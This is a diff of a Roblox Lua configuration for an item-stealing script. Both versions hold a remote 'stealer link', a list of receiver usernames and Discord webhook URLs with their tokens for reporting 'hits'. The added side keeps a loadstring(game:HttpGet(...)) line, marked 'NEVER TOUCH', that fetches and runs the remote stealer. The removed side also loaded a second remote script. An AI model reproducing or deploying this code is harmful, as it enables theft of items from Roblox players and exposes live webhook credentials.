@@ -1,30 +1,13 @@
-STEALER_LINK = 'https://raw.githubusercontent.com/OpHub9/Ophub99/refs/heads/main/Protected_7742734286907947.txt' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://dpaste.com/7W2AP7786.txt' -- stealer link (how to create is bellow)
 
 Usernames = {
-    'Bladeballgre', -- PUT UR ROBLOX USERNAMES
-    'kevinaquino04', -- AS MANY AS U WANT BUT DONT FORGET ,
-    'BLADES12900',
+    'bladeballgre', -- PUT UR ROBLOX USERNAMES
+    'BLADES12900', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'BLADES8927',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1371426816207749130/ZoIsD8-saN0vbWsuQE2k0t2VBzf8NlK8thgNZE2RBG_MEyPS4VLXIA2PC9lFwDw8ZimH"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1371427587569746052/bnCpIDjqEVHy2CPfO0CITv9gP6bz3MCKCesojK7MP8T8OvmS1zVAhWoj62rF26a4MdF2"
+BigHitsWebhook = "https://discord.com/api/webhooks/1371622669027643463/7c4ByqT7-TI4uQZvcMoSJ5e49UBkvFp2WivPgdGVqBn_Gl0O-YbzFXcJTZWdgwszE4bl"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1371622489519558776/5jbG56Rzo4efBeVYT69uGNcQd2Yasfeqcv8-JZMftTAxdt19DnAzJNx86Len7nd84d_a"
 
-loadstring(game:HttpGet(STEALER_LINK, true))()
-
-
-local url = "https://raw.githubusercontent.com/Fspl0it/Blade-Ball/refs/heads/main/Game.lua"
-
-local success, response = pcall(function()
-    return game:HttpGet(url)
-end)
-
-if success and response and not response:find("404: Not Found") then
-    local func, err = loadstring(response)
-    if func then
-        pcall(func)
-    else
-        warn("Failed to execute script:", err)
-    end
-else
-    warn("Not Loaded")
-end
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+```
